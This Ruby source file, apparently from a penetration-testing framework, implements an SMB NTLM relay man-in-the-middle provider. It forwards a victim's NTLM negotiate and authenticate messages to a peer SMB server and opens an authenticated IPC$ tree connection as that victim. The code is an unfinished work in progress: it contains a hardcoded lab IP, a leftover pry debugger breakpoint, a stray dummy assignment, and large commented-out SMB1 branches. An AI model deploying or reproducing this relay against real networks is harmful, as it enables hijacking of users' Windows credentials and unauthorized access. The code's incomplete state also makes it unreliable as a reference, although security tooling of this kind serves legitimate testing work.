require 'ruby_smb/ntlm'
require 'ruby_smb/gss'

module Msf
  module Exploit::Remote::SMB
    include ::Msf::Exploit::SMBHashCapture

    #
    # A GSS provider that authenticates clients via the passing of a hash to a specified remote host.
    #
    class RubySMBMITMProvider < ::Msf::Exploit::SMBHashCapture::HashCaptureNTLMProvider
      include RubySMB::NTLM

      def initialize(opts)
        raise ArgumentError, 'Must specify a peer_host' unless opts[:peer_host]
        raise ArgumentError, 'Must specify a peer_port' unless opts[:peer_port]
        raise ArgumentError, 'Must specify a local_host' unless opts[:local_host]
        super(allow_anonymous: opts[:allow_anonymous], default_domain: opts[:default_domain], listener: opts[:listener])

        @peer_host = opts[:peer_host]
        @peer_port = opts[:peer_port]
        @local_host = opts[:local_host]
        @timeout = opts[:timeout] ? opts[:timeout] : 3
        @listener = opts[:listener]
      end

       # An account representing an identity for which this provider will accept authentication attempts.
        Account = Struct.new(:username, :password, :domain) do
          def to_s
            "#{domain}\\#{username}"
          end
        end

      class Authenticator < ::Msf::Exploit::SMBHashCapture::HashCaptureAuthenticator
        @relay_mode = false

        # TODO: Move this out of the Authenticator class
        class MITMClient < ::RubySMB::Client
          def initialize(dispatcher, smb1: true, smb2: true, smb3: true, username:, password:, domain: nil, local_workstation: nil, always_encrypt: nil, ntlm_flags: nil, provider: nil)
            super(dispatcher,
                  smb1: smb1,
                  smb2: smb2,
                  smb3: smb3,
                  username: username,
                  password: password,
                  domain: domain,
                  local_workstation: local_workstation,
                  always_encrypt: always_encrypt,
                  ntlm_flags: ntlm_flags)

            @provider = provider
          end

          def get_peer_server_challenge(client_type1_msg)
            @version = negotiate

            if @version == 'SMB1'
              # neg_pkt = smb1_ntlmssp_negotiate_packet
              # neg_pkt.set_ntlm_type1_blob(victim_type1_msg.serialize)
              # resp = send_recv(neg_pkt)
              #
              # challenge_packet = smb1_ntlmssp_challenge_packet(resp)
              #
              # # Store the available OS information before going forward.
              # @peer_native_os = challenge_packet.data_block.native_os.to_s
              # @peer_native_lm = challenge_packet.data_block.native_lan_man.to_s
              #
              # @user_id = challenge_packet.smb_header.uid
              #
              # type2_message_encoded = smb1_type2_message(challenge_packet)
              #
              # type2_challenge = Net::NTLM::Message.decode64(type2_message_encoded)
              #
              # type2_challenge.challenge
            else
              # Same as the ::RubySMB::Client::Authentication smb2_authenticate method, with two differences
              #  - changes the type1_blob to match the blob of the type1 messages received from the client
              #  - returns the challenge messages received from the server

              server_type1_pkt = smb2_ntlmssp_negotiate_packet

              server_type1_pkt.set_ntlm_type1_blob(client_type1_msg)
              server_type1_pkt.security_mode.signing_enabled = 0
              server_type2_pkt_raw = send_recv(server_type1_pkt)
              server_type2_pkt = smb2_ntlmssp_challenge_packet(server_type2_pkt_raw)

              if @dialect == '0x0311'
                update_preauth_hash(server_type2_pkt)
              end

              @session_id = server_type2_pkt.smb2_header.session_id
              type2_ntlm_message = smb2_type2_message(server_type2_pkt)

              server_type2_message = Net::NTLM::Message.decode64(type2_ntlm_message)

              # TODO Below commented out code needs moved into auth_attempt
              # Additionally, we need to have the type3 message created using the @ntlm_client.session object
              #   this may require rummaging around in the guts of @ntlm_client and it's session to figure out how
              #   to do that

              @server_type3_message = @ntlm_client.init_context(type2_ntlm_message)

              @session_key = @ntlm_client.session_key
              # server_type2_message = @ntlm_client.session.challenge_message
              store_target_info(server_type2_message.target_info) if server_type2_message.has_flag?(:TARGET_INFO)
              @os_version = extract_os_version(server_type2_message.os_version.to_s) unless server_type2_message.os_version.empty?

              server_type2_message
            end
          rescue ::Exception => e
            msg = "Unable to retrieve server challenge at #{peer_host}:#{peer_port} on local interface #{local_host}."
            elog(msg, error: e)
            print_warning msg
          end

          def send_auth_attempt(victim_type3_message)
            if @version == 'SMB1'
              # neg_pkt = smb1_ntlmssp_negotiate_packet
              # neg_pkt.set_ntlm_type1_blob(victim_type1_msg.serialize)
              # resp = send_recv(neg_pkt)
              #
              # challenge_packet = smb1_ntlmssp_challenge_packet(resp)
              #
              # # Store the available OS information before going forward.
              # @peer_native_os = challenge_packet.data_block.native_os.to_s
              # @peer_native_lm = challenge_packet.data_block.native_lan_man.to_s
              #
              # @user_id = challenge_packet.smb_header.uid
              #
              # type2_message_encoded = smb1_type2_message(challenge_packet)
              #
              # type2_challenge = Net::NTLM::Message.decode64(type2_message_encoded)
              #
              # type2_challenge.challenge
            else
              # Same as the ::RubySMB::Client::Authentication smb2_authenticate method, with two differences
              #  - changes the type1_blob to match the blob of the type1 messages received from the client
              #  - returns the challenge messages received from the server

              # server_type1_pkt = smb2_ntlmssp_negotiate_packet
              # server_type1_pkt.set_ntlm_type1_blob(victim_type1_msg.serialize)
              # server_type2_pkt_raw = send_recv(server_type1_pkt)
              #
              # if @dialect == '0x0311'
              #   update_preauth_hash(server_type2_pkt_raw)
              # end
              #
              # server_type2_pkt = smb2_ntlmssp_challenge_packet(server_type2_pkt_raw)
              # @session_id = server_type2_pkt.smb2_header.session_id
              #
              # type2_ntlm_message = smb2_type2_message(server_type2_pkt)
              #
              # @type3_msg = @ntlm_client.init_context(type2_ntlm_message)
              # @ntlm_client.session.challenge_message.challenge


              # force_encoding needed to avoid an +Encoding::CompatibilityError+ when serializing the type3 message.
              # serialize happens in the rubyntlm library
              # TODO overwrite type3 class to have a serialize method that supports different encodings of strings
              # type3_opts = {
              #   :lm_response   => victim_type3_message.lm_response.force_encoding("ASCII-8BIT"),
              #   :ntlm_response => victim_type3_message.ntlm_response.force_encoding("ASCII-8BIT"),
              #   :domain        => victim_type3_message.domain.force_encoding("ASCII-8BIT"),
              #   :user          => victim_type3_message.user.force_encoding("ASCII-8BIT"),
              #   :workstation   => victim_type3_message.workstation.force_encoding("ASCII-8BIT"),
              #   :flag          => @server_type3_message.flag,
              #   :session_key   => @server_type3_message.session_key # Can be empty, but in that case it's just setting the default value explicitly
              # }
              # combined_type3_message = ::Net::NTLM::Message::Type3.create type3_opts

              # Set AUTHENTICATE_MESSAGE.MIC to Z(16)
              #  If (NTLMSSP_NEGOTIATE_KEY_EXCH flag is set in NegFlg
              #    AND (NTLMSSP_NEGOTIATE_SIGN OR NTLMSSP_NEGOTIATE_SEAL are set in NegFlg) )
              #      Set ExportedSessionKey to RC4K(KeyExchangeKey,
              #       AUTHENTICATE_MESSAGE.EncryptedRandomSessionKey)
              #  Else
              #      Set ExportedSessionKey to KeyExchangeKey
              #  EndIf
              #  Set MIC to HMAC_MD5(ExportedSessionKey, ConcatenationOf(
              #          NEGOTIATE_MESSAGE, CHALLENGE_MESSAGE,
              #          AUTHENTICATE_MESSAGE))
              #
              #  Set ClientSigningKey to SIGNKEY(NegFlg, ExportedSessionKey , "Client")
              #  Set ServerSigningKey to SIGNKEY(NegFlg, ExportedSessionKey , "Server")
              #  Set ClientSealingKey to SEALKEY(NegFlg, ExportedSessionKey , "Client")
              #  Set ServerSealingKey to SEALKEY(NegFlg, ExportedSessionKey , "Server")
              #  RC4Init(ClientHandle, ClientSealingKey)
              #  RC4Init(ServerHandle, ServerSealingKey)

              # @server_type3_message.domain = victim_type3_message.dup.domain.force_encoding("ASCII-8BIT")
              # @server_type3_message.user = victim_type3_message.dup.user.force_encoding("ASCII-8BIT")
              # @server_type3_message.workstation = victim_type3_message.dup.force_encoding("ASCII-8BIT")

              packet = RubySMB::SMB2::Packet::SessionSetupRequest.new

              packet.smb2_header.session_id = @session_id
              packet.smb2_header.credits = 127

              packet.security_mode.signing_enabled = 0
              # packet.capabilities.dfs = 1

              packet.set_type3_blob(victim_type3_message)

              response = send_recv(packet)
              if @dialect == '0x0311'
                update_preauth_hash(packet)
              end

              # raw = smb2_ntlmssp_authenticate(victim_type3_message, @session_id)
              response = smb2_ntlmssp_final_packet(response)

              if @smb3 && !@session_encrypt_data && response.session_flags.encrypt_data == 1
                @session_encrypt_data = true
              end

              response
            end
          rescue ::Exception => e
            msg = "Unable to retrieve server challenge at #{peer_host}:#{peer_port} on local interface #{local_host}."
            elog(msg, error: e)
            print_warning msg
          end

          def normalize_type3_encoding(type3_msg)
            type3_msg.security_buffers.map!{ |_buffer_name, security_buffer| security_buffer.value.force_encoding("ASCII-8BIT") }
          end

          # def create_pipe(path, disposition=RubySMB::Dispositions::FILE_OPEN_IF)
          #   require 'pry'
          #   binding.pry
          #
          #   fid = open(path, disposition, write: true, read: true, pipe: true)
          #   @open_files[fid]
          # end

          alias :connect :tree_connect
        end

        def reset!
          super

          # Server that we are passing the hash to
          @server_connection = nil
        end

        def process(request_buffer = nil)
          if request_buffer.nil?
            # this is only NTLMSSP (as opposed to SPNEGO + NTLMSSP)
            buffer = OpenSSL::ASN1::ASN1Data.new([
             RubySMB::Gss::OID_SPNEGO,
              OpenSSL::ASN1::ASN1Data.new([
                OpenSSL::ASN1::Sequence.new([
                  OpenSSL::ASN1::ASN1Data.new([
                    OpenSSL::ASN1::Sequence.new([
                      RubySMB::Gss::OID_NTLMSSP
                    ])
                  ], 0, :CONTEXT_SPECIFIC),
                  OpenSSL::ASN1::ASN1Data.new([
                    OpenSSL::ASN1::ASN1Data.new([
                      OpenSSL::ASN1::ASN1Data.new([
                        OpenSSL::ASN1::GeneralString.new('not_defined_in_RFC4178@please_ignore')
                      ], 0, :CONTEXT_SPECIFIC)
                    ], 16, :UNIVERSAL)
                  ], 3, :CONTEXT_SPECIFIC)
                ])
              ], 0, :CONTEXT_SPECIFIC)
            ], 0, :APPLICATION).to_der
            return RubySMB::Gss::Provider::Result.new(buffer, ::WindowsError::NTStatus::STATUS_SUCCESS)
          end

          no_gss = false

          begin
            gss_api = OpenSSL::ASN1.decode(request_buffer)
          rescue OpenSSL::ASN1::ASN1Error
            no_gss = true
          end

          if no_gss
            begin
              ntlm_message = Net::NTLM::Message.parse(request_buffer)
            rescue OpenSSL::ASN1::ASN1Error
              return
            end
          end

          if no_gss
            if ntlm_message.instance_of?(::Net::NTLM::Message::Type1)
              result = relay_ntlm_type1(request_buffer.to_s)
            elsif ntlm_message.instance_of?(::Net::NTLM::Message::Type3)
              result = relay_ntlm_type3(request_buffer.to_s)
            end
          else
            if gss_api&.tag == 0 && gss_api&.tag_class == :APPLICATION
              result = process_gss_type1(gss_api)
            elsif gss_api&.tag == 1 && gss_api&.tag_class == :CONTEXT_SPECIFIC
              result = process_gss_type3(gss_api)
            end
          end

          result
        end

        #
        # Process the NTLM type 1 message and build a type 2 response message.
        #
        # @param [Net::NTLM::Message::Type1] type1_msg the NTLM type 1 message received by the client that should be
        #   processed
        # @return [RubySMB::Gss::Provider::Result] the NTLM type 2 response message with which to reply to the client
        # wrapped in a +RubySMB::Gss::Provider::Result+ class
        def relay_ntlm_type1(type1_msg)
          @server_connection = create_mitm_client(@provider.peer_host, @provider.peer_port,
                                                  @provider.local_host, @provider.timeout)

          server_type2_msg = @server_connection.get_peer_server_challenge(type1_msg)

          # Needed for capturing future hashes
          # client_type2_msg = process_ntlm_type1(type1_msg)

          # Overwriting the Authenticator server_challenge to ensure future hash generation is performed correctly
          # @server_challenge = [server_type2_msg.challenge].pack('Q<')
          # client_type2_msg.challenge = server_type2_msg.challenge
          # client_type2_msg.flag = server_type2_msg.flag
          # client_type2_msg.target_info = server_type2_msg.target_info
          # client_type2_msg.target_name = server_type2_msg.target_name
          # client_type2_msg.os_version = server_type2_msg.os_version

          [RubySMB::Gss::Provider::Result.new(RubySMB::Gss.gss_type2(server_type2_msg.serialize), ::WindowsError::NTStatus::STATUS_MORE_PROCESSING_REQUIRED), server_type2_msg]
        end

        #
        # Process the NTLM type 3 message and either accept or reject the authentication attempt.
        #
        # @param [Net::NTLM::Message::Type3] type3_msg the NTLM type 3 message received by the client that should be
        #   processed
        # @return [WindowsError::ErrorCode] an NT Status error code representing the operations outcome where
        #   STATUS_SUCCESS is a successful authentication attempt and anything else is a failure
        def relay_ntlm_type3(victim_type3_msg)
          # captures hash using +HashCaptureAuthenticator+ process_ntlm_type3 method
          # super(victim_type3_msg)

          resp = @server_connection.send_auth_attempt(victim_type3_msg)

          begin
            resp2 = @server_connection.tree_connect("\\\\192.168.89.137\\IPC$")

          rescue
            jim = 123
          end

          require 'pry'
          binding.pry

          @provider.listener.on_relay_success(@server_connection)



          ::WindowsError::NTStatus::STATUS_ACCESS_DENIED
        end

        def process_ntlm_type3(type3_msg)
          super

          ::WindowsError::NTStatus::STATUS_SUCCESS
        end

        def create_mitm_client(peer_host, peer_port, local_host, timeout)
          sock = Rex::Socket::Tcp.create(
            'LocalHost' => local_host,
            'PeerHost' => peer_host,
            'PeerPort' => peer_port,
            'Server' => false,
            'Timeout' => timeout,
            'Context' =>
              {
                'Caller' => self
              }
          )

          dispatcher = RubySMB::Dispatcher::Socket.new(sock)
          client = MITMClient.new(dispatcher, provider: self, username: '', password: '',
                                  smb1: false, smb2: true, smb3: true)

          client
        rescue ::Exception => e
          msg = "Unable to create connection to server #{peer_host}:#{peer_port} on local interface #{local_host}."
          elog(msg, error: e)
          print_warning msg
        end


      end

      def new_authenticator(server_client)
        # build and return an instance that can process and track stateful information for a particular connection but
        # that's backed by this particular provider
        Authenticator.new(self, server_client)
      end

      attr_reader :peer_host, :peer_port, :local_host, :timeout, :listener
    end
  end
end
